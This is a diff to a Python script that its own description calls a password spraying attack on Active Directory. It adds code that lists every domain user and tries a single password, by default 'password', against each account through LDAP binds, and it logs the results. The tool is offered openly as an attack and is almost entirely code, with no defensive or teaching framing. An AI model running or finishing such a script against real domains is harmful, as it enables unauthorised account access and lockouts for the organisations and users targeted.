@@ -6,24 +6,21 @@
 #import some modules
 import argparse
 import ldap
+import active_directory
+
+
+for user in active_directory.search (objectCategory='Person', objectClass='User'):
+  print user
 
 #accept arguments
 # parse arguments
 ap = argparse.ArgumentParser(description='This is a password spraying attack') 
 ap.add_argument('dc', type=str, help='domain controller', default=None)
 ap.add_argument('--password', '-p', type=str, help='password to spray', default='password')
-ap.add_argument('--log', '-l',  help='write results to LOG', default='passSpray.txt')
+ap.add_argument('--log', '-l',  help='write results to LOG', default='passSpray.log')
 args = ap.parse_args()
 
 #establish logging
-
-#retrieve domain users list
-
-#loop through domain users with single password
-for user in users:
-	
-#log results
-
 
 
 def check_credentials(username, password):
@@ -42,7 +39,7 @@ def check_credentials(username, password):
    try:
        # build a client
        ldap_client = ldap.initialize(LDAP_SERVER)
-       # perform a synchronous bind
+       # perform an synchronous bind
        ldap_client.set_option(ldap.OPT_REFERRALS,0)
        ldap_client.simple_bind_s(LDAP_USERNAME, LDAP_PASSWORD)
    except ldap.INVALID_CREDENTIALS:
@@ -56,4 +53,18 @@ def check_credentials(username, password):
                    ldap.SCOPE_SUBTREE, ldap_filter, attrs)[0][1]['memberOf'])
    ldap_client.unbind()
    return None
+
+#retrieve domain users list
+users = [user for user in active_directory.search (objectCategory='Person', objectClass='User')]
+
+#import active_directory
+#users = active_directory.AD_object ("LDAP://ou=Users,dc=com,dc=example")
+#for user in users.search (objectCategory='Person'):
+#  print user
+
+#loop through domain users with single password
+for user in users:
+	check_credentials(user, args.password)
+
+#log results
 
